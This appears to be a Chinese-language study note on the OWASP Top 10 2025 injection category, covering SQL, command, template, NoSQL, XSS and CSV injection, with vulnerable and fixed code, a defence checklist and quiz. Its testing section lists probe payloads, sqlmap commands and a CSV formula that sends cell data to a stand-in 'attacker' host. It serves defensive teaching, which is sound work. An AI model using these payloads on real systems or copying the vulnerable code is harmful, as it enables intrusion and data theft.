# A05:2025 注入（Injection）

> 官方详情页：<https://top10.owasp.org/2025/A05_2025-Injection/>
> 排名：**第 5 位**（2021 版为第 3 位，**下降 2 位**）
> CWE 数量：37 个｜平均发生率：3.08%｜相关 CVE：**62,445（全榜最多）**
> 主要 CWE：CWE-79 跨站脚本（XSS，>30k CVE）、CWE-89 SQL 注入（>14k CVE）、CWE-78 OS 命令注入

## 一句话理解

注入就是**应用把不可信的用户输入当作代码/命令交给了某个解释器**（数据库、Shell、浏览器、模板引擎、LDAP 目录），使输入的一部分被执行而非被当作数据。

## 风险原理

唯一根本原因：**数据与命令没有分离**。

当一个字符串同时承载"结构（命令）"和"内容（数据）"时，攻击者只要在数据里插入结构字符，就能改变解释器的行为。人类语言里"`张三；删除全部记录`"只是句子，但在 SQL/Shell 里分号就是命令分隔符。

官方给出的"容易出问题"的情形：

- 用户数据未经校验、过滤或转义就被使用。
- 在解释器中直接用动态查询或非参数化调用，且没有上下文相关转义。
- 把未净化数据放进 ORM 的搜索参数，从而取出额外的敏感记录。
- 把潜在敌意数据直接使用或拼接。

2025 版特别指出：**LLM 的提示词注入（Prompt Injection）属于另一类**，放在 [OWASP LLM Top 10](https://genai.owasp.org/llm-top-10/) 的 LLM01 讨论，不归入本类别。

ASCII 数据流图（SQL 注入）：

```
正常:  SELECT * FROM accounts WHERE custID = 'U123'
                                       ^^^^^^ 只有数据

攻击输入 ' OR '1'='1
实际:  SELECT * FROM accounts WHERE custID = '' OR '1'='1'
                                       ^^^^^^^^^^^^^^^^ 结构被改写
                                             => 返回全表
```

## 典型场景与真实案例模式

> 以下为"某类系统常见的模式"归纳，不指向具体厂商事件。

- **报表/搜索功能。** `q=` 参数被拼进 SQL，攻击者用 `' OR 1=1--` 或 `UNION SELECT` 读取其他表。
- **排序/分页参数。** `?sort=name` 被直接拼接到 `ORDER BY`——此处**无法用参数化占位符**，是绑定参数覆盖不到的盲区。
- **模糊"用了 ORM 就安全"。** Hibernate HQL、Django `extra()`/`RawSQL`、MyBatis `${}`（而非 `#{}`）仍可注入。
- **命令调用。** 图片处理、格式转换、DNS 查询等功能把文件名/域名拼进 shell 命令。
- **模板注入。** 允许用户自定义通知模板/邮件模板，服务端渲染用户可控模板（SSTI），可升级为 RCE。
- **XSS。** 评论、昵称、个人签名等存储型输入未做输出编码，导致存储型 XSS 影响所有浏览者。
- **LDAP/XPath/NoSQL 注入。** 登录接口用字符串拼接构造查询，用 `{"$ne": null}` 或 `*)(|(password=*` 绕过认证。
- **CSV 注入。** 导出功能未对以 `=`、`+`、`-`、`@` 开头的单元格做前缀处理，用户打开表格时触发公式执行。
- **HTTP 头注入 / 响应拆分。** 用户输入进入 `Location`、`Set-Cookie` 等响应头，插入 CRLF 拆分响应。

## 怎么测

对应 WSTG 测试项：

- [WSTG-INPV-01](../wstg/checklist.md) 反射型 XSS
- [WSTG-INPV-02](../wstg/checklist.md) 存储型 XSS
- [WSTG-INPV-03](../wstg/checklist.md) HTTP 动词篡改
- [WSTG-INPV-04](../wstg/checklist.md) HTTP 参数污染
- [WSTG-INPV-05](../wstg/checklist.md) SQL 注入（含 5.1–5.8 各数据库与 NoSQL/ORM 子项）
- [WSTG-INPV-06](../wstg/checklist.md) LDAP 注入
- [WSTG-INPV-07](../wstg/checklist.md) XML 注入
- [WSTG-INPV-09](../wstg/checklist.md) XPath 注入
- [WSTG-INPV-11](../wstg/checklist.md) 代码注入（含 11.1 文件包含）
- [WSTG-INPV-12](../wstg/checklist.md) 命令注入
- [WSTG-INPV-15](../wstg/checklist.md) HTTP 响应拆分
- [WSTG-INPV-16](../wstg/checklist.md) HTTP 请求走私
- [WSTG-INPV-18](../wstg/checklist.md) 服务端模板注入（SSTI）
- [WSTG-INPV-19](../wstg/checklist.md) SSRF
- [WSTG-INPV-20](../wstg/checklist.md) 批量赋值（Mass Assignment）
- [WSTG-INPV-21](../wstg/checklist.md) CSV 注入
- [WSTG-INPV-22](../wstg/checklist.md) 原型链污染
- [WSTG-INPV-23](../wstg/checklist.md) 不安全反序列化
- [WSTG-CLNT-01](../wstg/checklist.md) DOM 型 XSS

**手工测试步骤**

1. **先做注入点探测。** 在每个参数提交单引号、双引号，观察报错或行为差异：
   ```
   '  "  \  ;  )
   ```
   SQL 注入经典探测串：
   ```
   ' OR '1'='1
   ' AND 1=2--
   ' UNION SELECT NULL--
   '; WAITFOR DELAY '0:0:5'--     # SQL Server 时间盲注
   ' AND SLEEP(5)--                # MySQL 时间盲注
   ```
2. **判断是否可注入（布尔盲注）。** 比较 `id=1 AND 1=1` 与 `id=1 AND 1=2` 的响应差异。
3. **用 sqlmap 验证（仅限授权目标/靶场）。**
   ```bash
   sqlmap -u 'https://target/item?id=1' --batch --level=3 --risk=2
   sqlmap -r request.txt -p id --dbs        # 从保存的请求中测试
   ```
4. **XSS 探测。** 提交带唯一标记的 payload，在响应体中搜索该标记是否未编码：
   ```html
   "><script>alert(1)</script>
   <img src=x onerror=alert(document.domain)>
   <svg/onload=alert(1)>
   ```
   区分反射型（立即回显）与存储型（再次访问页面时触发）。
5. **命令注入探测。**
   ```bash
   # 输入 127.0.0.1 的 ping 功能
   127.0.0.1; id
   127.0.0.1 && id
   127.0.0.1 | id
   127.0.0.1 $(id)
   127.0.0.1 `id`
   127.0.0.1%0aid        # 换行绕过
   ```
   盲注可用时间延迟：`127.0.0.1; sleep 5`。
6. **SSTI 探测。**
   ```
   {{7*7}}          # 返回 49 -> Jinja2/Twig 类
   ${7*7}           # 返回 49 -> Freemarker 类
   <%= 7*7 %>       # 返回 49 -> ERB 类
   ```
   确认后可进一步构造读取文件/RCE 的载荷（仅限靶场）。
7. **NoSQL 注入。** 对 JSON 登录接口提交：
   ```json
   {"username":"admin","password":{"$ne":null}}
   {"username":{"$gt":""},"password":{"$gt":""}}
   ```
8. **CSV 注入。**
   ```
   =HYPERLINK("http://attacker/?"&A1)
   =cmd|'/C calc'!A0
   ```
   提交到会被导出的字段，下载 CSV 用文本编辑器确认公式未被前缀化。

## 代码示例

### 易受攻击的代码（Java / JDBC）

```java
// 危险 1：字符串拼接 SQL
String q = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery(q);

// 危险 2：拼接 OS 命令
String cmd = "nslookup " + request.getParameter("domain");
Runtime.getRuntime().exec(cmd);

// 危险 3：即使参数化，表名/列名仍来自用户（无法用占位符）
String sort = request.getParameter("sort");
st.executeQuery("SELECT * FROM items ORDER BY " + sort);
```

### 修复后的代码

```java
// 修复 1：参数化查询，数据永远不进入 SQL 结构
String q = "SELECT * FROM accounts WHERE custID = ?";
try (PreparedStatement ps = conn.prepareStatement(q)) {
    ps.setString(1, request.getParameter("id"));
    ResultSet rs = ps.executeQuery();
}

// 修复 2：不经过 shell；把参数作为独立数组传递，或使用库而非外部命令
String domain = request.getParameter("domain");
// 先用允许列表校验域名格式
if (!domain.matches("^[a-zA-Z0-9.-]+$")) throw new IllegalArgumentException();
ProcessBuilder pb = new ProcessBuilder("nslookup", domain);   // 无 shell，参数分离
pb.start();

// 修复 3：结构名不能用占位符 -> 用允许列表映射，绝不接受原始输入
Map<String, String> SORTABLE = Map.of(
    "name", "name", "date", "created_at", "price", "price");
String sortCol = SORTABLE.get(request.getParameter("sort"));
if (sortCol == null) throw new IllegalArgumentException();
st.executeQuery("SELECT * FROM items ORDER BY " + sortCol + " ASC");
```

### 修复 XSS（Node.js + 输出编码）

```js
// 危险：直接把用户输入拼进 HTML
res.send(`<div>${req.query.name}</div>`);
```

```js
// 修复 A：模板引擎默认输出编码（EJS 用 <%= %> 而非 <%- %>）
res.render('profile', { name: req.query.name });   // profile.ejs 内使用 <%= name %>

// 修复 B：手动编码（根据输出上下文选择：HTML/属性/JS/URL/CSS）
const escapeHtml = require('escape-html');
res.send(`<div>${escapeHtml(req.query.name)}</div>`);

// 修复 C：配合 CSP（不要用 unsafe-inline）作为纵深防御
// Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

### 修复 SSTI（Python / Jinja2）

```python
# 危险：用户输入被当作模板渲染
from jinja2 import Template
Template(request.args["tpl"]).render()
```

```python
# 修复：模板固定，用户数据只作为变量传入
from flask import render_template
render_template("notification.html", name=user_name)   # 模板不来自用户
```

## 防御清单

- [ ] **首选方案：分离数据与命令。** 使用安全 API、参数化接口，或迁移到 ORM。
- [ ] 用**正向（允许列表）服务端输入校验**，而不是黑名单过滤。
- [ ] 残余动态查询：按该解释器专用的转义语法转义特殊字符（注意：SQL 的**表名/列名等结构无法转义**，用户可控结构名一律危险）。
- [ ] 所有输出按**上下文**编码：HTML 正文、HTML 属性、JavaScript、URL、CSS 各不相同。
- [ ] 避免调用外部命令；必须调用时使用 `ProcessBuilder`/`execFile` 式参数分离，禁用 shell。
- [ ] 用 CSP 作为纵深防御（禁止 `unsafe-inline`、`unsafe-eval`）。
- [ ] 在 CI/CD 中接入 SAST / DAST / IAST 与模糊测试，尽早发现注入。
- [ ] 注意存储过程仍可能注入：若 PL/SQL/T-SQL 内部拼接或使用 `EXECUTE IMMEDIATE`/`exec()`，参数化也救不了。
- [ ] 导出的 CSV/Excel 对以 `= + - @`、Tab、CR 开头的单元格加前缀（如 `'`）。
- [ ] 反序列化不使用不可信数据；必须时使用可校验格式（如 JSON + 结构校验）与签名。
- [ ] 参考 [Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)、[SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)、[Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)、[XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)。

## 常见坑

- **坑 1：以为"过滤了单引号"就安全。** 数字型注入不需要引号；不同数据库、不同上下文需要的字符不同；黑名单永远有绕过（`UNION/**/SELECT`、编码、`||`）。
- **坑 2：输出编码用错上下文。** 在 HTML 正文安全转义，放进 `<script>` 或 `href="javascript:"` 就失效。必须按输出位置选择编码器。
- **坑 3：编码时机错误。** 应该在**输出时**编码，而不是"存储时编码"。存储时编码会导致数据被多次编码、损坏，且无法支持多种输出上下文。
- **坑 4：ORM 万能论。** 原生 SQL 片段、`ORDER BY`、字符串拼接的表名、HQL、MyBatis `${}` 全都能绕过 ORM 的安全机制。
- **坑 5：参数化解决一切。** 结构名（表/列/排序方向）不能用占位符，必须用允许列表映射。
- **坑 6：`Runtime.exec(String)` 有 shell 语义。** 单字符串形式会经过 shell 解析，分号、管道有效；必须用数组/参数分离形式。
- **坑 7：只在入参处过滤，漏掉 HTTP 头。** `User-Agent`、`Referer`、`X-Forwarded-For`、Cookie 同样是注入源，很多日志/统计功能直接把它们写入数据库或页面。
- **坑 8：二次注入（stored/second-order）。** 第一次写入时做了转义，第二次从数据库取出再拼接时转义已失效。

## 自测题

**1. 应用使用 PreparedStatement 做参数化查询，但排序参数写成 `ORDER BY " + sort + "`。是否还存在注入？如何修复？**

<details><summary>答案</summary>

存在。占位符只能替代**数据**，不能替代 SQL 结构（列名/表名/排序方向）。攻击者可在 `sort` 中注入表达式或子查询（如 `(CASE WHEN ... THEN ... END)`）。修复：用允许列表把"用户可选值"映射到"固定列名"，不在拼接中引入任何原始输入。
</details>

**2. 为什么在存储时对用户输入做 HTML 转义是错误的做法？**

<details><summary>答案</summary>

因为同一份数据可能有多种输出上下文（HTML 页面、JSON API、CSV 导出、邮件）。存储时转义会：导致数据被污染（显示 `&lt;` 字面量）、支持多上下文时重复编码、无法在非 HTML 上下文中正确使用。正确做法是**输出时按上下文编码**。
</details>

**3. HQL（Hibernate Query Language）使用参数拼接 `FROM accounts WHERE custID='" + id + "'`，是否有注入风险？**

<details><summary>答案</summary>

有。HQL 虽然函数集比原生 SQL 受限，但仍允许通过 `' OR custID IS NOT NULL OR custID='` 之类输入改写查询逻辑，造成越权数据读取。应对 HQL 同样使用命名/位置参数绑定。
</details>

**4. 一个导出功能把用户填写的"备注"字段原样写入 CSV，为什么这是个安全问题？**

<details><summary>答案</summary>

这叫 CSV 注入（公式注入）。若备注以 `=`、`+`、`-`、`@` 开头，受害者用 Excel 打开时会被当作公式执行，可能触发命令执行（`=cmd|'/C calc'!A0`）或数据外带（`=HYPERLINK(...)`）。修复：对这类开头字符加前缀（如 `'`），导出时统一处理。
</details>

**5. 为什么"参数化之后，存储过程就绝对安全"这个说法是错的？**

<details><summary>答案</summary>

因为存储过程内部如果继续拼接 SQL 或用 `EXECUTE IMMEDIATE`/`exec()` 动态执行传入的字符串，那参数化只保护了"调用存储过程"这一层，内部的动态 SQL 仍然可注入。需要审计存储过程内部是否分离了数据与命令。
</details>

## 来源

- <https://top10.owasp.org/2025/A05_2025-Injection/>
- <https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection/README>
- <https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html>
